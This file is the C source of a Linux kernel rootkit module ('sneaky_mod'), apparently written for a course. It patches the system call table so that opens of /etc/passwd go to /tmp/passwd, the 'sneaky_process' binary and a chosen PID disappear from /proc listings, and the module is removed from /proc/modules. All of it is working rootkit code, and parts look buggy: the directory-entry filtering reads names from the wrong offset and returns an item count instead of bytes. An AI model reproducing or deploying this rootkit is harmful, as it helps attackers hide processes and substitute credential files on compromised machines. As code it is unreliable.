#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/fs.h>           // for file operations
#include <linux/slab.h>         // for kmalloc and kfree
#include <linux/uaccess.h>      // for copy_to_user and copy_from_user
#include <linux/file.h>


#define PREFIX "sneaky_process"

// =========#2
struct linux_dirent64 {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  unsigned char d_type;
  char d_name[];
};

// =========#4
static pid_t sneaky_pid = 0;
module_param(sneaky_pid, int, 0);
MODULE_PARM_DESC(sneaky_pid, "The process ID of the sneaky process");

//This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// ===========Define your new sneaky version of the 'openat' syscall===========================
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  // Implement the sneaky part here
  // Cast the filename pointer from the registers
  char __user *filename = (char __user *)regs->di;

  // Buffer to store the filename
  char fname[256];

  // Copy the filename from userspace to kernel space
  strncpy_from_user(fname, filename, sizeof(fname));

  // Check if the file being opened is /etc/passwd
  if (strcmp(fname, "/etc/passwd") == 0) {
    // Redirect the openat call to /tmp/passwd
    copy_to_user(filename, "/tmp/passwd", sizeof("/tmp/passwd"));
  }
  return (*original_openat)(regs);
}

// ===========To hide the "sneaky_process" executable file from the ls and find commands========
// Save the original getdents64 system call function pointer:
asmlinkage int (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

asmlinkage int sneaky_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
  int nread;
  int n_items;
  struct linux_dirent64 *d;
  char *name;
  char *buf;
  char *tmp;
  struct file *file;
  char path_buf[64];
  char *path;

  nread = original_getdents64(fd, dirp, count);
  if (nread <= 0) {
    return nread;
  }

  file = fget(fd);
  if (!file) {
    return nread;
  }

  path = d_path(&file->f_path, path_buf, sizeof(path_buf));
  fput(file);

  if (IS_ERR(path)) {
    return nread;
  }

  if (strcmp(path, "/proc") != 0) {
    return nread;
  }

  buf = (char *)kmalloc(nread, GFP_KERNEL);
  if (!buf) {
    return nread;
  }

  if (copy_from_user(buf, dirp, nread)) {
    kfree(buf);
    return nread;
  }

  tmp = buf;
  n_items = 0;
  while (nread > 0) {
    d = (struct linux_dirent64 *)tmp;
    name = tmp + d->d_reclen - 1;

    if (strcmp(name, "sneaky_process") != 0 && simple_strtol(name, NULL, 10) != sneaky_pid) {
      memcpy(dirp, d, d->d_reclen);
      dirp = (struct linux_dirent64 *)((char *)dirp + d->d_reclen);
      n_items++;
    }
    nread -= d->d_reclen;
    tmp += d->d_reclen;
  }
  kfree(buf);
  return n_items;
}

// =========To hide the sneaky_module from the list of active kernel modules
// declare a pointer to the original read system call
asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
// create a sneaky_read function to intercept the read system call
asmlinkage ssize_t sneaky_read(int fd, void *buf, size_t count) {
  ssize_t nread;
  struct file *file;
  char path_buf[64];
  char *path;
  char *start;
  char *end;

  nread = original_read(fd, buf, count);
  if (nread <= 0) {
    return nread;
  }

  file = fget(fd);
  if (!file) {
    return nread;
  }

  path = d_path(&file->f_path, path_buf, sizeof(path_buf));
  fput(file);

  if (IS_ERR(path)) {
    return nread;
  }

  if (strcmp(path, "/proc/modules") != 0) {
    return nread;
  }

  start = strstr(buf, "sneaky_mod");
  if (!start) {
    return nread;
  }

  end = strchr(start, '\n');
  if (!end) {
    return nread;
  }

  end++; // move past the newline character
  memmove(start, end, nread - (end - (char *)buf));
  nread -= (end - start);

  return nread;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // openat
  original_openat = (void *)sys_call_table[__NR_openat];
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;

  // getdents64
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;

  // read
  original_read = (void *)sys_call_table[__NR_read];
  sys_call_table[__NR_read] = (unsigned long)sneaky_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0; // to show a successful load
}



static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // Restore the original 'openat' system call function address
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  // Restore the original 'getdents64' system call function address
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  // Restore the original 'read' system call function address
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);
}


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");